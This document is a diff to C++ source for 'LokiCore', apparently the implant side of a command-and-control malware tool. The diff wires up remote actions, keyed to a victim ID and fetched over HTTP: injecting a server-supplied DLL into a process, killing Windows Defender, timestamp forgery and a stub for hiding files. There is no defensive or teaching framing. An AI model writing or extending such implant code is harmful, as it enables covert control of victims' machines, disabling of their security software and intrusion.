@@ -9,6 +9,9 @@
 #include "IPC.h"
 #include "NetSignature.h"
 #include "TimeStomping.h"
+#include "Utils.h"
+#include "DLLInjection.h"
+#include "WinDefKiller.h"
 
 using namespace std;
 
@@ -18,6 +21,8 @@ class LokiCore{
 		TimeStomping = 0,
 		DLLInjection = 1,
 		ListProcesses = 2,
+		WinDefenderKiller = 3,
+		HideFile = 4,
 	};
 
 	public:
@@ -29,12 +34,16 @@ class LokiCore{
 			ipc.storeStringADS(fakeID);
 			string victimID = ipc.readStringADS();
 
-			/*TimeStompingClass timeStomper = TimeStompingClass();
 
-			char srcfile[] = "C:\\Users\\Public\\Documents\\test.txt";
-			char destfile[] = "C:\\Users\\Public\\Documents\\test2.txt";
 
-			timeStomper.copyStamps(srcfile, destfile);*/
+			/*Utils utils = Utils();
+			int pid = utils.getPIDbyProcName("notepad.exe");
+
+			DLLInjector dllInjector = DLLInjector();
+			char dllPath[] = "C:\\Users\\b\\Desktop\\LokiServer\\LokiServer\\bin\\Debug\\net7.0\\System.Data.SqlClient.dll";
+			dllInjector.DLLinjector(pid, dllPath);*/
+
+
 
 			string lastAction = "-1";
             while (true) {
@@ -56,13 +65,15 @@ class LokiCore{
 				string dstFile;
 				char srcFileChar[MAX_PATH];
 				char dstFileChar[MAX_PATH];
-
+				string dllPath = "";
+				int pid;
+				string processName;
 
 				switch (actionInt) {
 					
 					case TimeStomping:
 						TimeStompingClass timeStomper = TimeStompingClass();
-						params = timeStomper.httpTimeStompingAction(victimID, action);
+						params = http.httpGetParamsAction(victimID, action);
 
 						srcFile = params.substr(params.find("srcFile=") + 8, params.find(",") - 8);
 						dstFile = params.substr(params.find("dstFile=") + 8, params.length() - 8);
@@ -74,10 +85,29 @@ class LokiCore{
 						break;
 
 					case DLLInjection:
-						// instructions for DLL injection
+						params = http.httpGetParamsAction(victimID, action);
+						processName = params.substr(params.find("process=") + 8, params.find(",") - 8);
+						dllPath = params.substr(params.find("dllPath=") + 8, params.length() - 8);
+
+						Utils utils = Utils();
+						pid = utils.getPIDbyProcName("notepad.exe");
+
+						DLLInjector dllInjector = DLLInjector();
+						dllInjector.DLLinjector(pid, dllPath.c_str());
 						break;
+
 					case ListProcesses:
 						// instructions for listing processes			
+						break;
+
+					case WinDefenderKiller:
+						WinDefKiller winDefKiller = WinDefKiller();
+						winDefKiller.killWinDefender();
+						break;
+					
+					case HideFile:
+						// instructions for hiding file
+
 						break;
 				}
 
